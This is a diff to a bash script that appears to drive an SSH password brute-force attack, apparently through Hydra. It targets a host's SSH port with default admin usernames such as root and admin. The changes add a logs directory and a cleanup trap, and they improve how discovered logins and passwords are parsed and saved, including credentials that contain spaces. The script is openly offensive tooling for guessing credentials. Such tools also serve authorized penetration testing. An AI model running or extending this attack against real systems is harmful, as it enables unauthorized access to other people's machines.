@@ -17,8 +17,14 @@ TARGET=""
 PORT=22
 RESUME_FILE="$PROJECT_ROOT/logs/ssh_resume.txt"
 
+# Ensure logs directory exists
+mkdir -p "$PROJECT_ROOT/logs"
+
 # Common admin usernames
 DEFAULT_USERNAMES=(root admin administrator sysadmin user)
+
+# Trap for cleanup
+trap 'rm -f "$output_file" 2>/dev/null' EXIT ERR
 
 # Function to display help
 show_help() {
@@ -144,9 +150,9 @@ run_attack() {
               ssh://$TARGET:$PORT 2>&1 | while IFS= read -r line; do
             
             if [[ $line == *"host:"* ]] && [[ $line == *"login:"* ]] && [[ $line == *"password:"* ]]; then
-                # Parse successful login
-                local login=$(echo "$line" | grep -oP 'login: \K[^ ]+')
-                local password=$(echo "$line" | grep -oP 'password: \K[^ ]+')
+                # Parse successful login (support credentials with spaces)
+                local login=$(echo "$line" | sed -n 's/.*login: \(.*\) password:.*/\1/p')
+                local password=$(echo "$line" | sed -n 's/.*password: \(.*\)/\1/p')
                 
                 save_result "ssh" "$TARGET" "$login" "$password" "$PORT"
                 log_success "Valid credentials found: $login:$password"
